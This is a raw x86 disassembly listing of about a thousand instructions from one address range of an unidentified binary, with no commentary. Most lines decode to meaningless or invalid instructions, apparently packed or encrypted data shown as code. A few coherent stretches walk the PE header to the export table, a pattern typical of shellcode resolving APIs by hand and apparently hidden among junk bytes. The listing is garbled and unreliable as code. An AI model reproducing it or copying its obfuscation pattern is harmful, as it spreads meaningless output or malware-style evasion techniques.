  408490:	fstp   TBYTE PTR [ebx]
  408492:	mov    al,ds:0xb5ac156d
  408497:	inc    ebx
  408498:	push   esi
  408499:	xchg   edi,eax
  40849a:	mov    ah,0x6f
  40849c:	or     DWORD PTR [ecx],esi
  40849e:	fidivr WORD PTR [edx]
  4084a0:	sti    
  4084a1:	enter  0x2bba,0xe
  4084a5:	inc    esp
  4084a6:	ja     0x408429
  4084a8:	mov    ah,0x8a
  4084aa:	add    al,0xc4
  4084ac:	dec    ebx
  4084ad:	loop   0x4084a0
  4084af:	pop    esp
  4084b0:	and    al,0x78
  4084b2:	adc    DWORD PTR [edi+edi*8-0xe],0x5b
  4084b7:	sub    cl,BYTE PTR [edx]
  4084b9:	sbb    bh,BYTE PTR [edx-0x30deb78f]
  4084bf:	cli    
  4084c0:	or     ebp,DWORD PTR [edi+0x3ba03e0b]
  4084c6:	jae    0x408478
  4084c8:	adc    DWORD PTR [eax],esp
  4084ca:	outs   dx,BYTE PTR ds:[esi]
  4084cb:	mov    edx,0x5314b7a2
  4084d0:	pop    esi
  4084d1:	adc    DWORD PTR [eax+0x28],0x59
  4084d5:	inc    esp
  4084d6:	test   BYTE PTR [edi-0x1c0deeec],ah
  4084dc:	adc    al,0x52
  4084de:	fsub   DWORD PTR [ebp+eiz*4-0x534301c6]
  4084e5:	or     al,0x13
  4084e7:	sbb    eax,0xea7aac64
  4084ec:	xchg   ebx,eax
  4084ed:	icebp  
  4084ee:	sti    
  4084ef:	test   DWORD PTR [eax],ecx
  4084f1:	or     al,0x1d
  4084f3:	ins    DWORD PTR es:[edi],dx
  4084f4:	and    al,0x43
  4084f6:	sahf   
  4084f7:	sbb    eax,0x805d167c
  4084fc:	(bad)  
  4084fe:	xchg   edi,eax
  4084ff:	mov    eax,0x7dc8cf2a
  408504:	dec    ecx
  408505:	ror    edx,cl
  408507:	add    eax,DWORD PTR [ebx-0x591af246]
  40850d:	adc    esp,ebx
  40850f:	sbb    BYTE PTR [esi+0x308d31b2],dh
  408515:	and    al,0xa0
  408517:	and    al,0x5f
  408519:	pushw  0xa34d
  40851d:	fidivr WORD PTR [ecx]
  40851f:	call   0x4b89:0xda85acb
  408526:	sub    BYTE PTR [ecx+0x29],ch
  408529:	jnp    0x408592
  40852b:	cmp    al,0x70
  40852d:	cmp    bl,BYTE PTR [eax]
  40852f:	push   esi
  408530:	cdq    
  408531:	int3   
  408532:	cmp    al,0x24
  408534:	adc    esi,DWORD PTR [ecx*8+0x51a86aeb]
  40853b:	xor    al,0xf1
  40853d:	dec    ebx
  40853e:	(bad)  
  40853f:	imul   edi,DWORD PTR [edi+0x47],0x66
  408543:	addr16 int3 
  408545:	push   0x2a
  408547:	ficomp DWORD PTR [edx-0x78]
  40854a:	inc    ebp
  40854b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40854c:	fmul   DWORD PTR [ecx+0x5ad8a45a]
  408552:	xchg   esi,eax
  408553:	cmp    bl,BYTE PTR [edi+0x34]
  408556:	jns    0x40859d
  408558:	iret   
  408559:	adc    eax,0x6a349161
  40855e:	push   ss
  40855f:	leave  
  408560:	in     al,0x94
  408562:	stos   BYTE PTR es:[edi],al
  408563:	hlt    
  408564:	inc    edi
  408565:	lock daa 
  408567:	mov    bh,0x50
  408569:	fs and eax,0x32a8a66e
  40856f:	fidiv  DWORD PTR [esi+0x2b16267]
  408575:	push   cs
  408576:	add    eax,0x8e214197
  40857b:	add    ecx,ebx
  40857d:	lock push cs
  40857f:	xchg   ebx,eax
  408580:	dec    edx
  408581:	xor    BYTE PTR [eax+0x51],cl
  408584:	(bad)  
  408585:	fwait
  408586:	jg     0x4085c2
  408588:	in     al,0x1e
  40858a:	(bad)  
  40858b:	dec    esp
  40858c:	fdiv   DWORD PTR [edi+0x3f]
  40858f:	adc    BYTE PTR [ecx],ch
  408591:	stos   BYTE PTR es:[edi],al
  408592:	test   DWORD PTR [ecx+0x51e3faaa],0xebc2ed9b
  40859c:	mov    ds:0x1dc6f547,al
  4085a1:	sar    bl,1
  4085a3:	pop    ds
  4085a4:	fwait
  4085a5:	sbb    DWORD PTR [eax+0x128194cd],ecx
  4085ab:	push   esi
  4085ac:	dec    esp
  4085ad:	inc    ebp
  4085ae:	sbb    bl,dl
  4085b0:	push   esi
  4085b1:	inc    esp
  4085b2:	ror    BYTE PTR [edx+0x2827c5e6],1
  4085b8:	mov    bl,0xd8
  4085ba:	movups xmm3,xmm2
  4085bd:	adc    BYTE PTR [ebx],ch
  4085bf:	ins    DWORD PTR es:[edi],dx
  4085c0:	or     al,0xef
  4085c2:	dec    ebp
  4085c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c4:	mov    DWORD PTR [eax-0x27],ebp
  4085c7:	mov    al,0xea
  4085c9:	cmc    
  4085ca:	lods   eax,DWORD PTR ds:[esi]
  4085cb:	lahf   
  4085cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085cd:	adc    DWORD PTR [ecx],esi
  4085cf:	and    eax,0xe47aee08
  4085d4:	fidiv  WORD PTR [esi+edx*1-0x77976503]
  4085db:	push   esi
  4085dc:	arpl   WORD PTR ds:0x71d9bcf7,si
  4085e2:	add    BYTE PTR [eax-0x54d25c83],dl
  4085e8:	xchg   edx,eax
  4085e9:	inc    esi
  4085ea:	adc    dh,BYTE PTR [edx]
  4085ec:	jl     0x408613
  4085ee:	sbb    edx,DWORD PTR [edi+0x321dfed6]
  4085f4:	(bad)  
  4085f6:	into   
  4085f7:	out    dx,al
  4085f8:	sbb    BYTE PTR [ebp+0x6c5f890c],dl
  4085fe:	adc    eax,0xa5fed069
  408603:	shl    edx,cl
  408605:	jmp    FWORD PTR [edx-0x559fb084]
  40860b:	mov    ds:0xcbc58aca,al
  408610:	call   0x1407abe8
  408615:	mov    WORD PTR [edx+0x2e],fs
  408618:	and    al,0x9
  40861a:	popf   
  40861b:	adc    ecx,esi
  40861d:	and    DWORD PTR [eax+0x3327228b],ecx
  408623:	sub    esp,DWORD PTR [esi+ecx*4-0x72c7e57f]
  40862a:	retf   0x2c94
  40862d:	in     al,0xe1
  40862f:	xchg   ecx,eax
  408630:	push   ss
  408631:	push   eax
  408632:	add    bl,BYTE PTR [eax-0x32]
  408635:	test   BYTE PTR [edx],bl
  408637:	in     eax,0x1d
  408639:	(bad)  
  40863a:	pop    edi
  40863b:	aaa    
  40863c:	mov    DWORD PTR [edi-0x29463d69],eax
  408642:	cmp    ch,cl
  408644:	add    DWORD PTR [eax-0x51],0x6210506f
  40864b:	dec    ebx
  40864c:	dec    eax
  40864d:	cmp    ah,BYTE PTR [eax]
  40864f:	jecxz  0x40861e
  408651:	sub    al,0x69
  408654:	adc    al,0xf
  408656:	test   DWORD PTR [eax+eax*1],ecx
  408659:	add    BYTE PTR [eax],al
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xaae95e04
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [ecx],dl
  40869e:	inc    esp
  40869f:	dec    edi
  4086a0:	sub    DWORD PTR [ebx+edx*4],esp
  4086a3:	xor    BYTE PTR [esi],bl
  4086a5:	movd   mm2,DWORD PTR [edx+0x21]
  4086a9:	fbstp  TBYTE PTR [ebp+0x31]
  4086ac:	xchg   esp,eax
  4086ad:	xlat   BYTE PTR ds:[ebx]
  4086ae:	into   
  4086af:	test   DWORD PTR [edi+0x790a9607],edx
  4086b5:	js     0x408674
  4086b7:	fbld   TBYTE PTR [ebp+edx*1+0x6]
  4086bb:	fstp   TBYTE PTR [esi-0x614fcbf4]
  4086c1:	scas   al,BYTE PTR es:[edi]
  4086c2:	dec    edx
  4086c3:	ss iret 
  4086c5:	sbb    bh,BYTE PTR [ebx-0x392ba925]
  4086cb:	jns    0x408711
  4086cd:	ret    0xf682
  4086d0:	in     al,dx
  4086d1:	pop    edx
  4086d2:	(bad)  
  4086d3:	xchg   edx,eax
  4086d4:	fidivr WORD PTR [esp+eiz*4-0x73]
  4086d8:	in     eax,0x35
  4086da:	inc    edi
  4086db:	(bad)  
  4086dc:	ja     0x408727
  4086de:	dec    ecx
  4086df:	and    al,0xb1
  4086e1:	xlat   BYTE PTR ds:[ebx]
  4086e2:	mov    ebx,esi
  4086e4:	cmp    ch,BYTE PTR [esi+0x1bf3f01a]
  4086ea:	in     eax,0x66
  4086ec:	push   ds
  4086ed:	in     eax,dx
  4086ee:	mov    esi,0x7b5b2aa8
  4086f3:	inc    esp
  4086f4:	repz dec ebx
  4086f6:	ja     0x40868b
  4086f8:	sbb    BYTE PTR [edi-0x7e2471be],bl
  4086fe:	fbld   TBYTE PTR [ebx+0x275f1237]
  408704:	bound  ecx,QWORD PTR [edi+esi*4+0x37]
  408708:	jmp    0xf7a9:0xd44ee66f
  40870f:	push   edx
  408710:	scas   eax,DWORD PTR es:[edi]
  408711:	call   0x580c467a
  408716:	sbb    edx,DWORD PTR [ecx]
  408718:	outs   dx,DWORD PTR ds:[esi]
  408719:	rcl    BYTE PTR es:[esi],1
  40871c:	or     dl,BYTE PTR [ebx+ebx*1-0x5e559ad]
  408723:	xlat   BYTE PTR ds:[ebx]
  408724:	les    esp,FWORD PTR [edx-0x7dd865cd]
  40872a:	xlat   BYTE PTR ds:[ebx]
  40872b:	(bad)  
  40872c:	pop    edi
  40872d:	dec    edi
  40872e:	push   ebx
  40872f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408730:	stos   DWORD PTR es:[edi],eax
  408731:	add    esp,DWORD PTR [esi-0x18837e7a]
  408737:	sbb    ebx,ebp
  408739:	js     0x408712
  40873b:	or     eax,0xfabafccf
  408740:	sbb    ch,0xab
  408743:	xchg   ebp,eax
  408744:	into   
  408745:	push   0x258a00ac
  40874a:	xlat   BYTE PTR ds:[ebx]
  40874b:	rcr    BYTE PTR [eax-0x3d77887a],cl
  408751:	cmp    dh,bl
  408753:	add    eax,0xd95644b4
  408758:	call   0x279f:0xd5389b35
  40875f:	jle    0x4086ef
  408761:	(bad)  
  408762:	loopne 0x408790
  408764:	jp     0x408773
  408766:	push   es
  408767:	arpl   di,si
  408769:	dec    ecx
  40876a:	out    0x8,eax
  40876c:	test   BYTE PTR [eax+edi*2],cl
  40876f:	jo     0x408780
  408771:	lock mov eax,0xd28f642
  408777:	int3   
  408778:	and    al,0x6f
  40877a:	push   0x74
  40877c:	je     0x4087ce
  40877e:	fwait
  40877f:	inc    BYTE PTR [eax-0x1e313ece]
  408785:	mov    edi,0x30acaf47
  40878a:	xor    eax,0x7e7d705c
  40878f:	aaa    
  408790:	add    al,BYTE PTR [edi-0x22a2c6b7]
  408796:	or     bl,BYTE PTR [ebx*2+0x63f2ec38]
  40879d:	fwait
  40879e:	add    eax,0xeefade04
  4087a3:	(bad)  
  4087a4:	cmp    BYTE PTR [ebx+0x95bc9ed],dh
  4087aa:	repz mov WORD PTR [edx],ds
  4087ad:	mov    BYTE PTR [eax+esi*1+0x20],dl
  4087b1:	sbb    eax,DWORD PTR [ebp-0x73]
  4087b4:	test   DWORD PTR [edx+0x7],ebp
  4087b7:	add    BYTE PTR [esi+0x20],cl
  4087ba:	inc    edx
  4087bb:	test   DWORD PTR [edx+0x2f],edx
  4087be:	pop    eax
  4087bf:	adc    eax,0xa334111b
  4087c4:	xor    eax,0xe073add9
  4087c9:	cdq    
  4087ca:	inc    esp
  4087cb:	adc    bl,ch
  4087cd:	rcr    BYTE PTR [si-0x19],0x7
  4087d2:	jnp    0x4087bd
  4087d4:	imul   esp,DWORD PTR [eax+ebp*1+0x4f546cf],0x3f
  4087dc:	xor    eax,0x872b9e77
  4087e1:	dec    edi
  4087e2:	fstp   QWORD PTR [edx]
  4087e4:	mov    al,ds:0xa1c8e21a
  4087e9:	repz dec eax
  4087eb:	xor    esi,0xf1677954
  4087f1:	sub    al,bl
  4087f3:	hlt    
  4087f4:	outs   dx,BYTE PTR ds:[esi]
  4087f5:	inc    esp
  4087f6:	mov    eax,ds:0x42667073
  4087fb:	nop
  4087fc:	or     eax,0xebc54bd4
  408801:	rcr    BYTE PTR [ecx+ebp*8+0x503d8ab3],1
  408808:	xchg   esi,eax
  408809:	je     0x4087c6
  40880b:	cdq    
  40880c:	mov    dl,0xed
  40880e:	push   esi
  40880f:	xor    BYTE PTR [ebp+0x57],al
  408812:	je     0x4087fa
  408814:	pop    eax
  408815:	popf   
  408816:	add    eax,0x9a49d2ae
  40881b:	jg     0x40886b
  40881d:	stos   BYTE PTR es:[edi],al
  40881e:	inc    ebx
  40881f:	add    BYTE PTR [ecx-0x7455af44],cl
  408825:	dec    ebx
  408826:	pop    ebx
  408827:	in     eax,0xc6
  408829:	inc    ebp
  40882a:	dec    esp
  40882b:	fdiv   QWORD PTR [edx+0x19dd2ca2]
  408831:	out    0x8,eax
  408833:	and    ebx,DWORD PTR [eax]
  408835:	sub    DWORD PTR [edi+0x50],ecx
  408838:	mov    eax,ds:0x6ed25cdc
  40883d:	pop    ebp
  40883e:	aaa    
  40883f:	push   edi
  408840:	aam    0x32
  408842:	popf   
  408843:	pop    es
  408844:	out    dx,al
  408845:	jo     0x408880
  408847:	in     al,dx
  408848:	gs jo  0x4087fa
  40884b:	inc    ecx
  40884c:	adc    ch,BYTE PTR [esi-0x7d348677]
  408852:	xchg   ebp,eax
  408853:	mov    edi,0xbf3db3b3
  408858:	sbb    edx,esp
  40885a:	aad    0x92
  40885c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885d:	inc    ebp
  40885e:	arpl   WORD PTR [ecx-0x76],si
  408861:	xchg   ebx,eax
  408862:	fs jb  0x4088bb
  408865:	jmp    0x1c55:0x4e5474d4
  40886c:	jmp    FWORD PTR [edx+0x7976badb]
  408872:	cwde   
  408873:	iret   
  408874:	push   ds
  408875:	cld    
  408876:	inc    edi
  408877:	scas   al,BYTE PTR es:[edi]
  408878:	or     bh,dl
  40887a:	pop    ds
  40887b:	retf   0xe60a
  40887e:	add    al,0x69
  408880:	mov    ch,BYTE PTR [eax+0x2d]
  408883:	rcl    DWORD PTR ds:0x3e098a4a,cl
  408889:	loop   0x40889c
  40888b:	push   esp
  40888c:	lahf   
  40888d:	push   esi
  40888e:	leave  
  40888f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408890:	mov    eax,ds:0x62e2618b
  408895:	sbb    DWORD PTR [esi+0x54c21bd0],0x2a
  40889c:	adc    eax,0xc39572f0
  4088a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a2:	xchg   edi,eax
  4088a3:	jl     0x4088c4
  4088a5:	mov    esp,0x57fdb192
  4088aa:	mov    ebx,0xdc05ac13
  4088af:	xor    edx,DWORD PTR [ebp-0x44b3c02c]
  4088b5:	addr16 daa 
  4088b7:	sub    eax,0x7b78ebb1
  4088bc:	fldenv ds:[esi-0x4651b89e]
  4088c3:	jecxz  0x408859
  4088c5:	pop    ebx
  4088c6:	imul   ecx,esi,0xffffff83
  4088c9:	add    eax,0x3edea503
  4088ce:	enter  0x2da7,0xa4
  4088d2:	ds (bad) 
  4088d4:	ins    BYTE PTR es:[edi],dx
  4088d5:	pushf  
  4088d6:	inc    ebx
  4088d7:	repnz arpl WORD PTR [esi+0x3eb0ab23],dx
  4088de:	cld    
  4088df:	and    al,0x79
  4088e1:	(bad)  
  4088e2:	in     al,dx
  4088e3:	mov    esp,0x3a1b43e6
  4088e8:	nop
  4088e9:	cmp    al,BYTE PTR [eax-0x5a]
  4088ec:	call   0x2767a721
  4088f1:	mov    BYTE PTR [eax+0x46],dl
  4088f4:	call   0x85d9:0x9cd7fea7
  4088fb:	je     0x408912
  4088fd:	push   0xc432d658
  408902:	add    eax,0x3112768
  408907:	ss mov bh,0x22
  40890a:	mov    al,0x3d
  40890c:	cli    
  40890d:	loope  0x4088b8
  40890f:	clc    
  408910:	mov    bl,0x79
  408912:	sbb    DWORD PTR [edi],0xd26ec86e
  408918:	out    0x30,eax
  40891a:	ret    0x8a78
  40891d:	(bad)  
  40891e:	sbb    esi,eax
  408920:	je     0x40891b
  408922:	in     al,0x28
  408924:	sbb    DWORD PTR [eax+0x1b],ebp
  408927:	test   DWORD PTR [ecx-0x76],eax
  40892a:	dec    ebp
  40892b:	stc    
  40892c:	das    
  40892d:	xor    dl,BYTE PTR ds:0xd1458c11
  408933:	lods   al,BYTE PTR ds:[esi]
  408934:	push   0x6a3c13b3
  408939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40893a:	rcr    DWORD PTR [ecx+0x68b6ab83],cl
  408940:	dec    edi
  408941:	sbb    BYTE PTR [eax-0x43],bh
  408944:	push   ecx
  408945:	fucomp st(3)
  408947:	mov    ds:0x4bf15963,al
  40894c:	ret    0x6283
  40894f:	mov    dl,0xa6
  408951:	and    DWORD PTR [ebx],esp
  408953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408954:	add    ah,ah
  408956:	dec    edi
  408957:	xlat   BYTE PTR ds:[ebx]
  408958:	mov    ch,0x81
  40895a:	or     esi,ebx
  40895c:	mov    bh,0x6d
  40895e:	sbb    al,0xf4
  408960:	dec    edi
  408961:	jns    0x40895f
  408963:	mov    ds:0x8c713081,eax
  408968:	fbld   TBYTE PTR [esp+edx*8-0x5d]
  40896c:	add    BYTE PTR [ebp+0x584f5194],dl
  408972:	cld    
  408973:	sbb    DWORD PTR [edx],ebp
  408975:	mov    bl,0x53
  408977:	pop    es
  408978:	jnp    0x4089ba
  40897a:	adc    al,0xb8
  40897c:	popa   
  40897d:	in     eax,0x8f
  40897f:	ds push edx
  408981:	jp     0x4089f6
  408983:	push   esi
  408984:	out    dx,al
  408985:	(bad)  
  408986:	pushf  
  408987:	popa   
  408988:	mov    ecx,0x443a6d6d
  40898d:	rcr    ah,cl
  40898f:	test   DWORD PTR [eax+0x47c3ba78],ebp
  408995:	mov    dh,BYTE PTR ds:[eax-0x1e153ec1]
  40899c:	mov    DWORD PTR [eax+ecx*8+0x3c],edi
  4089a0:	test   edx,ebp
  4089a2:	dec    edx
  4089a3:	sub    eax,0x9e7e7c78
  4089a8:	cmp    esp,DWORD PTR [esi]
  4089aa:	aad    0xf4
  4089ac:	dec    ebp
  4089ad:	dec    edx
  4089ae:	mov    ch,0x74
  4089b0:	cdq    
  4089b1:	daa    
  4089b2:	inc    esp
  4089b3:	and    al,0x9e
  4089b5:	xchg   DWORD PTR [edi+0x5],esi
  4089b8:	mov    bh,0x2c
  4089ba:	neg    edx
  4089bc:	loop   0x408973
  4089be:	mov    ebx,0x96d45c79
  4089c3:	test   DWORD PTR [edx+0x2d],ebp
  4089c6:	mov    esp,0xa9b18ae5
  4089cb:	pop    eax
  4089cc:	test   eax,0xe7c8381e
  4089d1:	pop    eax
  4089d2:	and    ah,BYTE PTR [ecx-0x25]
  4089d5:	inc    edx
  4089d6:	and    BYTE PTR [edx+0x2b],0xd7
  4089da:	cmp    eax,0x5d7a7ccf
  4089df:	adc    eax,0xb02eef43
  4089e4:	je     0x4089fe
  4089e6:	push   eax
  4089e7:	ins    DWORD PTR es:[edi],dx
  4089e8:	jne    0x408a37
  4089ea:	daa    
  4089eb:	jns    0x40899a
  4089ed:	sub    DWORD PTR [esi],ebx
  4089ef:	ret    
  4089f0:	adc    ebx,DWORD PTR [eax+ecx*1-0x4e809a41]
  4089f7:	div    DWORD PTR [esi]
  4089f9:	or     DWORD PTR [ebx+0x3d],esp
  4089fc:	scas   al,BYTE PTR es:[edi]
  4089fd:	(bad)  
  4089fe:	xor    eax,0x6bd0dbb3
  408a03:	scas   al,BYTE PTR es:[edi]
  408a04:	jge    0x408990
  408a06:	dec    edx
  408a07:	out    dx,eax
  408a08:	clc    
  408a09:	shl    BYTE PTR [esi-0x80],cl
  408a0c:	test   al,0xec
  408a0e:	fcmove st,st(7)
  408a10:	and    al,dl
  408a12:	call   0xe4a4:0xe410023a
  408a19:	cmp    ecx,DWORD PTR [esi+esi*8]
  408a1c:	std    
  408a1d:	cmp    BYTE PTR ds:0xa062b55,ah
  408a23:	lds    ecx,FWORD PTR [esi]
  408a25:	xchg   edi,eax
  408a26:	test   eax,0xe19c5809
  408a2b:	mov    esi,DWORD PTR [ecx-0x27]
  408a2e:	stos   DWORD PTR es:[edi],eax
  408a2f:	pop    ds
  408a30:	lahf   
  408a31:	cmp    al,0xe3
  408a33:	or     al,0x1b
  408a35:	test   BYTE PTR [esi+ebp*8],ah
  408a38:	gs enter 0x2e36,0x28
  408a3d:	neg    BYTE PTR [ecx+ecx*4-0x7]
  408a41:	or     ebx,esp
  408a43:	and    DWORD PTR [ebp+ecx*4+0x3e],esp
  408a47:	push   ecx
  408a48:	hlt    
  408a49:	fiadd  DWORD PTR ss:[ecx]
  408a4c:	push   ds
  408a4d:	or     ecx,eax
  408a4f:	enter  0x3724,0x81
  408a53:	push   cs
  408a54:	xor    DWORD PTR [esp+esi*4],edi
  408a57:	mov    ebp,cs
  408a59:	adc    al,BYTE PTR [ebp+0x12]
  408a5c:	or     al,0xe8
  408a5e:	mov    eax,DWORD PTR [esi]
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a75:	xchg   esp,eax
  408a76:	mov    cl,0xb0
  408a78:	mov    ch,0x57
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [ecx+0x4a316ef1],cl
  408a85:	mul    DWORD PTR [ebx+0x7e]
  408a88:	jne    0x408a23
  408a8a:	inc    esp
  408a8b:	dec    edx
  408a8c:	ret    
  408a8d:	pop    edi
  408a8e:	jle    0x408aef
  408a90:	icebp  
  408a91:	mov    ds:0xd5fcdeed,eax
  408a96:	scas   eax,DWORD PTR es:[edi]
  408a97:	aam    0x62
  408a99:	jns    0x408a8f
  408a9b:	js     0x408a97
  408a9d:	loopne 0x408b10
  408a9f:	pop    edx
  408aa0:	retf   
  408aa1:	retf   0xddca
  408aa4:	sahf   
  408aa5:	nop
  408aa6:	mov    ch,cl
  408aa8:	stos   BYTE PTR es:[edi],al
  408aa9:	mov    eax,0x1c2d5b77
  408aae:	inc    bx
  408ab0:	mov    dl,0xc5
  408ab2:	aas    
  408ab3:	in     eax,dx
  408ab4:	mov    ds:0xda955b19,al
  408ab9:	jl     0x408ab1
  408abb:	pop    edx
  408abc:	or     al,0xd9
  408abe:	xor    BYTE PTR [esi],dl
  408ac0:	sub    al,0x19
  408ac2:	sbb    DWORD PTR [edx],edx
  408ac4:	push   eax
  408ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac6:	or     al,0x8a
  408ac8:	aaa    
  408ac9:	pop    edx
  408aca:	nop
  408acb:	(bad)  
  408acc:	hlt    
  408acd:	xor    DWORD PTR fs:[ebx],esp
  408ad0:	sub    ah,al
  408ad2:	xor    al,BYTE PTR [eax-0xf932c1d]
  408ad8:	inc    esi
  408ad9:	adc    DWORD PTR ds:0x8aa2107e,ecx
  408adf:	imul   edx,ebp,0x59
  408ae2:	lock rcr BYTE PTR [esi-0x6e],1
  408ae6:	sbb    eax,0xaeebf972
  408aeb:	outs   dx,BYTE PTR ds:[esi]
  408aec:	pop    ss
  408aed:	jge    0x408afc
  408aef:	loopne 0x408b1a
  408af1:	and    eax,0xbf78576b
  408af6:	jo     0x408afa
  408af8:	mov    edi,DWORD PTR [esi+ebp*4-0x5ac896da]
  408aff:	mov    ebp,0x98800de9
  408b04:	scas   eax,DWORD PTR es:[edi]
  408b05:	mov    esi,0xc7dcb5b7
  408b0a:	(bad)  
  408b0b:	enter  0x8eac,0x21
  408b0f:	mov    ch,0x89
  408b11:	loope  0x408b26
  408b13:	pusha  
  408b14:	xor    bl,BYTE PTR [edi+0x4ffd55af]
  408b1a:	jmp    0x5376:0xfad51f9c
  408b21:	shr    eax,1
  408b23:	xchg   esp,eax
  408b24:	sbb    eax,0x377362c1
  408b29:	inc    ebx
  408b2a:	aaa    
  408b2b:	ret    0x33da
  408b2e:	pusha  
  408b2f:	lods   eax,DWORD PTR ds:[esi]
  408b30:	ins    DWORD PTR es:[edi],dx
  408b31:	shl    dl,0xf3
  408b34:	in     eax,dx
  408b35:	dec    edx
  408b36:	(bad)  
  408b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b38:	push   ebx
  408b39:	mov    eax,ds:0xbf4c1fef
  408b3e:	sar    BYTE PTR [esi+0x4e6f7a7d],0xad
  408b45:	aaa    
  408b46:	push   ds
  408b47:	push   0x28d0ac0b
  408b4c:	out    dx,al
  408b4d:	test   DWORD PTR [ecx+0x3792a19],ebx
  408b53:	les    esp,FWORD PTR [eax]
  408b55:	dec    ecx
  408b56:	dec    edi
  408b57:	fidivr WORD PTR [ecx+0x626bd7c0]
  408b5d:	inc    ebp
  408b5e:	retf   
  408b5f:	adc    al,al
  408b61:	mov    esp,0x58287f63
  408b66:	inc    ebp
  408b67:	ss sti 
  408b69:	mov    ds:0xba3325e8,eax
  408b6e:	vhaddps xmm3,xmm4,XMMWORD PTR [edi-0x76]
  408b73:	xor    edi,DWORD PTR [ebx]
  408b75:	sbb    DWORD PTR ds:0xc2d6faa9,0x1596ed0d
  408b7f:	sbb    eax,0x507f407a
  408b84:	shl    bh,cl
  408b86:	outs   dx,DWORD PTR ds:[esi]
  408b87:	jle    0x408b20
  408b89:	loope  0x408b37
  408b8b:	push   0x68d75854
  408b90:	cmp    DWORD PTR [esi+0x28],ecx
  408b93:	pushf  
  408b94:	xchg   edx,eax
  408b95:	stos   DWORD PTR es:[edi],eax
  408b96:	fnstsw WORD PTR ds:0xdb57141f
  408b9c:	mov    esi,eax
  408b9e:	jnp    0x408bb6
  408ba0:	imul   edx,esp,0xffffffa6
  408ba3:	dec    esp
  408ba4:	adc    DWORD PTR [eax-0x47],eax
  408ba7:	(bad)
  408baa:	push   esi
  408bab:	push   eax
  408bac:	mov    dh,0x61
  408bae:	in     al,dx
  408baf:	xchg   edi,eax
  408bb0:	retf   
  408bb1:	fist   DWORD PTR [esi]
  408bb3:	fldenv [edi-0x7e0c7cbd]
  408bb9:	fld    DWORD PTR [edx+0x21]
  408bbc:	out    dx,al
  408bbd:	push   edx
  408bbe:	cwde   
  408bbf:	inc    eax
  408bc0:	test   DWORD PTR [ecx],edx
  408bc2:	push   esi
  408bc3:	sbb    DWORD PTR [ebp+eax*8-0x490bb013],ecx
  408bca:	mov    edi,0x652aad55
  408bcf:	mov    al,0x39
  408bd1:	in     eax,0x4f
  408bd3:	imul   eax,DWORD PTR [ecx],0xffffffbd
  408bd6:	call   0x33d1b829
  408bdb:	mov    ebx,0xd7bf43d5
  408be0:	aaa    
  408be1:	sti    
  408be2:	jne    0x408bb9
  408be4:	inc    esp
  408be5:	push   esp
  408be6:	push   edi
  408be7:	mov    ebx,0x9a555798
  408bec:	dec    edx
  408bed:	jmp    0x408c68
  408bef:	scas   al,BYTE PTR es:[edi]
  408bf0:	cli    
  408bf1:	call   0x1bdf:0x464a77a9
  408bf8:	lea    ecx,[esi+0x139f9ab6]
  408bfe:	mov    eax,DWORD PTR [edi]
  408c00:	push   ss
  408c01:	or     al,0xec
  408c03:	add    eax,0x30b7585e
  408c08:	scas   al,BYTE PTR es:[edi]
  408c09:	lea    ebp,[ecx+edx*1]
  408c0c:	mov    BYTE PTR [edx+edx*8-0x1f96c573],al
  408c13:	enter  0xc254,0x4a
  408c17:	cmp    al,0x46
  408c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c1a:	ja     0x408c13
  408c1c:	pop    ebx
  408c1d:	or     edi,DWORD PTR [edx]
  408c1f:	adc    eax,0x6e
  408c22:	dec    ebx
  408c23:	dec    eax
  408c24:	add    esp,DWORD PTR [ecx-0x1a]
  408c27:	or     DWORD PTR [ebx+0x6b],esp
  408c2a:	les    ecx,FWORD PTR [ebx+0x2848f0d7]
  408c30:	sub    edi,DWORD PTR [ecx+0x7d]
  408c33:	adc    dh,BYTE PTR [edi]
  408c35:	ins    DWORD PTR es:[edi],dx
  408c36:	mov    eax,DWORD PTR [ebx]
  408c38:	retf   0x9024
  408c3b:	or     ebp,eax
  408c3d:	xlat   BYTE PTR ds:[ebx]
  408c3e:	(bad)  
  408c3f:	stc    
  408c40:	sbb    esp,DWORD PTR [edx]
  408c42:	pop    esp
  408c43:	stc    
  408c44:	mov    BYTE PTR [eax],bl
  408c46:	repz jo 0x408c9d
  408c49:	and    BYTE PTR [edi+0x74b04204],cl
  408c4f:	inc    eax
  408c50:	cmp    ah,BYTE PTR [edx]
  408c52:	pop    ebp
